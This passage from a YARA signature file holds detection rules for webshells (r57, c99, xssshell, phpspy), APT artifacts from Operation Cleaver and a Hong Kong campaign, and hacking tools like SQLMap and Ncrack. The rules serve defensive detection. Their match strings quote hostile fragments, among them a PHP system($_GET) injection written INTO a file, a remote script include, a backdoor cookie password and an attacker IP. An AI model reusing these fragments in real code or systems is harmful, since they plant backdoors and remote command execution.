      author = "Florian Roth"
      reference = "https://blog.sucuri.net/2014/12/soaksoak-malware-compromises-100000-wordpress-websites.html"
      date = "2014-12-15 13:39:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "wp_enqueue_script(\"swfobject\");" ascii fullword
      $s1 = "function FuncQueueObject()" ascii fullword
      $s2 = "add_action(\"wp_enqueue_scripts\", 'FuncQueueObject');" ascii fullword
   condition: 
      all of ( $s* )
}

rule HawkEye_PHP_Panel_RID2D55 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Detects HawkEye Keyloggers PHP Panel"
      author = "Florian Roth"
      reference = "-"
      date = "2014-12-14 10:27:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$fname = $_GET['fname'];" ascii fullword
      $s1 = "$data = $_GET['data'];" ascii fullword
      $s2 = "unlink($fname);" ascii fullword
      $s3 = "echo \"Success\";" fullword ascii
   condition: 
      all of ( $s* ) and filesize < 600
}

rule OPCLEAVER_Parviz_Developer_RID3092 : APT DEMO G0003 {
   meta:
      description = "Parviz developer known from Operation Cleaver"
      author = "Florian Roth"
      reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
      date = "2014-12-02 12:45:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, G0003"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Users\\parviz\\documents\\" nocase
   condition: 
      $s1
}

rule OPCLEAVER_CCProxy_Config_RID2F6E : APT DEMO G0003 {
   meta:
      description = "CCProxy config known from Operation Cleaver"
      author = "Florian Roth"
      reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
      date = "2014-12-02 11:56:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, G0003"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "UserName=User-001" fullword ascii
      $s2 = "Web=1" fullword ascii
      $s3 = "Mail=1" fullword ascii
      $s4 = "FTP=0" fullword ascii
      $x1 = "IPAddressLow=78.109.194.114" fullword ascii
   condition: 
      all of ( $s* ) or $x1
}

rule aspbackdoor_EDIT_RID2D1F : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Disclosed hacktool set (old stuff) - file EDIT.ASP"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 10:18:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "<meta HTTP-EQUIV=\"Content-Type\" CONTENT=\"text/html;charset=gb_2312-80\">" fullword ascii
      $s2 = "Set thisfile = fs.GetFile(whichfile)" fullword ascii
      $s3 = "response.write \"<a href='index.asp'>" fullword ascii
      $s5 = "if Request.Cookies(\"password\")=\"juchen\" then " fullword ascii
      $s6 = "Set thisfile = fs.OpenTextFile(whichfile, 1, False)" fullword ascii
      $s7 = "color: rgb(255,0,0); text-decoration: underline }" fullword ascii
      $s13 = "if Request(\"creat\")<>\"yes\" then" fullword ascii
   condition: 
      5 of them
}

rule Webshell_aspfile2_RID2DBC : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Disclosed hacktool set (old stuff) - file aspfile2.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 10:44:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "response.write \"command completed success!\" " fullword ascii
      $s1 = "for each co in foditems " fullword ascii
      $s3 = "<input type=text name=text6 value=\"<%= szCMD6 %>\"><br> " fullword ascii
      $s19 = "<title>Hello! Welcome </title>" fullword ascii
   condition: 
      all of them
}

rule Webshell_aspbackdoor_EDIR_RID30B2 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Disclosed hacktool set (old stuff) - file EDIR.ASP"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 12:50:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "response.write \"<a href='index.asp'>" fullword ascii
      $s3 = "if Request.Cookies(\"password\")=\"" ascii
      $s6 = "whichdir=server.mappath(Request(\"path\"))" fullword ascii
      $s7 = "Set fs = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
      $s19 = "whichdir=Request(\"path\")" fullword ascii
   condition: 
      all of them
}

rule JSP_jfigueiredo_APT_webshell_RID31E3 : APT DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "JSP Browser used as web shell by APT groups - author: jfigueiredo"
      author = "Florian Roth"
      reference = "http://ceso.googlecode.com/svn/web/bko/filemanager/Browser.jsp"
      date = "2014-10-12 13:41:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $a1 = "String fhidden = new String(Base64.encodeBase64(path.getBytes()));" ascii
      $a2 = "<form id=\"upload\" name=\"upload\" action=\"ServFMUpload\" method=\"POST\" enctype=\"multipart/form-data\">" ascii
   condition: 
      all of them
}

rule JSP_jfigueiredo_APT_webshell_2_RID3274 : APT DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "JSP Browser used as web shell by APT groups - author: jfigueiredo"
      author = "Florian Roth"
      reference = "http://ceso.googlecode.com/svn/web/bko/filemanager/"
      date = "2014-10-12 14:05:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $a1 = "<div id=\"bkorotator\"><img alt=\"\" src=\"images/rotator/1.jpg\"></div>" ascii
      $a2 = "$(\"#dialog\").dialog(\"destroy\");" ascii
      $s1 = "<form id=\"form\" action=\"ServFMUpload\" method=\"post\" enctype=\"multipart/form-data\">" ascii
      $s2 = "<input type=\"hidden\" id=\"fhidden\" name=\"fhidden\" value=\"L3BkZi8=\" />" ascii
   condition: 
      all of ( $a* ) or all of ( $s* )
}

rule Webshell_and_Exploit_CN_APT_HK_RID3243 : APT CHINA DEMO EXPLOIT T1505_003 WEBSHELL Webshell {
   meta:
      description = "Webshell and Exploit Code in relation with APT against Honk Kong protesters"
      author = "Florian Roth"
      reference = "-"
      date = "2014-10-10 13:57:41"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, CHINA, DEMO, EXPLOIT, T1505_003, WEBSHELL, Webshell"
      minimum_yara = "3.5.0"
      
   strings:
      $a0 = "<script language=javascript src=http://java-se.com/o.js</script>" fullword
      $s0 = "<span style=\"font:11px Verdana;\">Password: </span><input name=\"password\" type=\"password\" size=\"20\">" 
      $s1 = "<input type=\"hidden\" name=\"doing\" value=\"login\">" 
   condition: 
      $a0 or ( all of ( $s* ) )
}

rule HKTL_Fierce2_RID2B23 : DEMO HKTL {
   meta:
      description = "This signature detects the Fierce2 domain scanner"
      author = "Florian Roth"
      reference = "-"
      date = "2014-07-01 08:53:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$tt_xml->process( 'end_domainscan.tt', $end_domainscan_vars," 
   condition: 
      1 of them
}

rule HKTL_Ncrack_RID2AF5 : DEMO HKTL T1110 {
   meta:
      description = "This signature detects the Ncrack brute force tool"
      author = "Florian Roth"
      reference = "-"
      date = "2014-07-01 09:40:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1110"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "NcrackOutputTable only supports adding up to 4096 to a cell via" 
   condition: 
      1 of them
}

rule HKTL_SQLMap_RID2AB1 : DEMO HKTL {
   meta:
      description = "This signature detects the SQLMap SQL injection tool"
      author = "Florian Roth"
      reference = "-"
      date = "2014-07-01 07:46:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "except SqlmapBaseException, ex:" 
   condition: 
      1 of them
}

rule Webshell_FeliksPack3___PHP_Shells_phpft_RID3606 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file phpft.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 16:38:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s6 = "PHP Files Thief" 
      $s11 = "http://www.4ngel.net" 
   condition: 
      all of them
}

rule Webshell_r57shell_RID2D9C : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file r57shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:39:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s11 = " $_POST['cmd']=\"echo \\\"Now script try connect to" 
   condition: 
      all of them
}

rule Webshell_eBayId_index3_RID2F7E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file index3.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:59:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s8 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"You" 
   condition: 
      all of them
}

rule Webshell_FSO_s_phvayv_RID2F5D : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file phvayv.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:54:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "wrap=\"OFF\">XXXX</textarea></font><font face" 
   condition: 
      all of them
}

rule Webshell_FSO_s_casus15_2_RID2FD5 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file casus15.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:14:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "copy ( $dosya_gonder" 
   condition: 
      all of them
}

rule Webshell_installer_RID2E74 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file installer.cmd"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:15:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Restore Old Vanquish" 
      $s4 = "ReInstall Vanquish" 
   condition: 
      all of them
}

rule Webshell_FSO_s_remview_2_RID304F : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file remview.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:34:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<xmp>$out</" 
      $s1 = ".mm(\"Eval PHP code\")." 
   condition: 
      all of them
}

rule Webshell_FeliksPack3___PHP_Shells_r57_RID34C2 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file r57.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 15:44:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file']." 
   condition: 
      all of them
}

rule Webshell_FSO_s_phvayv_2_RID2FEE : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file phvayv.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:18:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "rows=\"24\" cols=\"122\" wrap=\"OFF\">XXXX</textarea></font><font" 
   condition: 
      all of them
}

rule Webshell_elmaliseker_RID2F34 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file elmaliseker.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:47:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "javascript:Command('Download'" 
      $s5 = "zombie_array=array(" 
   condition: 
      all of them
}

rule Webshell_BackDooR__fr__RID2F80 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file BackDooR (fr).php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:59:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s3 = "print(\"<p align=\\\"center\\\"><font size=\\\"5\\\">Exploit include " 
   condition: 
      all of them
}

rule Webshell_FSO_s_ntdaddy_RID2FA7 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file ntdaddy.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:06:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "<input type=\"text\" name=\".CMD\" size=\"45\" value=\"<%= szCMD %>\"> <input type=\"s" 
   condition: 
      all of them
}

rule Webshell_HYTop_DevPack_upload_RID325B : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file upload.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 14:01:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<!-- PageUpload Below -->" 
   condition: 
      all of them
}

rule Webshell_FSO_s_RemExp_2_RID2FA1 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file RemExp.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:05:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = " Then Response.Write \"" 
      $s3 = "<a href= \"<%=Request.ServerVariables(\"script_name\")%>" 
   condition: 
      all of them
}

rule Webshell_FSO_s_c99_RID2D94 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file c99.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:37:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "\"txt\",\"conf\",\"bat\",\"sh\",\"js\",\"bak\",\"doc\",\"log\",\"sfc\",\"cfg\",\"htacce" 
   condition: 
      all of them
}

rule Webshell_PHP_shell_RID2E05 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:56:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "AR8iROET6mMnrqTpC6W1Kp/DsTgxNby9H1xhiswfwgoAtED0y6wEXTihoAtICkIX6L1+vTUYWuWz" 
      $s11 = "1HLp1qnlCyl5gko8rDlWHqf8/JoPKvGwEm9Q4nVKvEh0b0PKle3zeFiJNyjxOiVepMSpflJkPv5s" 
   condition: 
      all of them
}

rule Webshell_webadmin_RID2DED : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file webadmin.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:52:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<input name=\\\"editfilename\\\" type=\\\"text\\\" class=\\\"style1\\\" value='\".$this->inpu" 
   condition: 
      all of them
}

rule Webshell_ASP_commands_RID2F3B : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file commands.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:48:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "If CheckRecord(\"SELECT COUNT(ID) FROM VictimDetail WHERE VictimID = \" & VictimID" 
      $s2 = "proxyArr = Array (\"HTTP_X_FORWARDED_FOR\",\"HTTP_VIA\",\"HTTP_CACHE_CONTROL\",\"HTTP_F" 
   condition: 
      all of them
}

rule Webshell_r57shell_2_RID2E2D : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file r57shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:03:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "echo \"<br>\".ws(2).\"HDD Free : <b>\".view_size($free).\"</b> HDD Total : <b>\".view_" 
   condition: 
      all of them
}

rule Webshell_remview_2003_04_22_RID304F : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file remview_2003_04_22.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:34:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "\"<b>\".mm(\"Eval PHP code\").\"</b> (\".mm(\"don't type\").\" \\\"&lt;?\\\"" 
   condition: 
      all of them
}

rule Webshell_FSO_s_test_RID2E7F : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file test.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:17:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$yazi = \"test\" . \"\\r\\n\";" 
      $s2 = "fwrite ($fp, \"$yazi\");" 
   condition: 
      all of them
}

rule Webshell_RhV_webshell_RID2F6B : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file webshell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:56:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "RhViRYOzz" 
      $s1 = "d\\O!jWW" 
      $s2 = "bc!jWW" 
      $s3 = "0W[&{l" 
      $s4 = "[INhQ@\\" 
   condition: 
      all of them
}

rule Webshell_thelast_index3_RID3045 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file index3.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:32:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s5 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"Your Name\\\" field is r" 
   condition: 
      all of them
}

rule Webshell_HYTop_AppPack_2005_RID309F : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file 2005.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:47:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s6 = "\" onclick=\"this.form.sqlStr.value='e:\\hytop.mdb" 
   condition: 
      all of them
}

rule Webshell_xssshell_RID2E1C : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file xssshell.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:00:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "if( !getRequest(COMMANDS_URL + \"?v=\" + VICTIM + \"&r=\" + generateID(), \"pushComma" 
   condition: 
      all of them
}

rule Webshell_FeliksPack3___PHP_Shells_usr_RID353E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file usr.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 16:04:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<?php $id_info = array('notify' => 'off','sub' => 'aasd','s_name' => 'nurullahor" 
   condition: 
      all of them
}

rule Webshell_FSO_s_phpinj_RID2F48 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file phpinj.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:50:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s4 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';" 
   condition: 
      all of them
}

rule Webshell_xssshell_db_RID2F41 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file db.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:49:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s8 = "'// By Ferruh Mavituna | http://ferruh.mavituna.com" 
   condition: 
      all of them
}

rule Webshell_xssshell_default_RID3160 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file default.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 13:19:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s3 = "If ProxyData <> \"\" Then ProxyData = Replace(ProxyData, DATA_SEPERATOR, \"<br />\")" 
   condition: 
      all of them
}

rule Webshell_connector_ASP_RID2FB4 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file connector.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:08:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "If ( AttackID = BROADCAST_ATTACK )" 
      $s4 = "Add UNIQUE ID for victims / zombies" 
   condition: 
      all of them
}

rule Webshell_PHP_Shell_v1_7_RID2F81 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file PHP_Shell_v1.7.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:00:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s8 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]" 
   condition: 
      all of them
}

rule Webshell_xssshell_save_RID302A : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file save.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:28:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s4 = "RawCommand = Command & COMMAND_SEPERATOR & Param & COMMAND_SEPERATOR & AttackID" 
      $s5 = "VictimID = fm_NStr(Victims(i))" 
   condition: 
      all of them
}

rule Webshell_FSO_s_phpinj_2_RID2FD9 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file phpinj.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:14:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s9 = "<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 INTO" 
   condition: 
      all of them
}

rule Webshell_FSO_s_ajan_RID2E59 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file ajan.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:10:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s4 = "entrika.write \"BinaryStream.SaveToFile" 
   condition: 
      all of them
}

rule Webshell_c99shell_RID2D93 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file c99shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:37:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<br />Input&nbsp;URL:&nbsp;&lt;input&nbsp;name=\\\"uploadurl\\\"&nbsp;type=\\\"text\\\"&" 
   condition: 
      all of them
}

rule Webshell_phpspy_2005_full_RID3082 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file phpspy_2005_full.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:42:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s7 = "echo \"  <td align=\\\"center\\\" nowrap valign=\\\"top\\\"><a href=\\\"?downfile=\".urlenco" 
   condition: 
      all of them
}

rule Webshell_FSO_s_zehir4_2_RID2FA6 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file zehir4.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:06:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s4 = "\"Program Files\\Serv-u\\Serv" 
   condition: 
      all of them
}

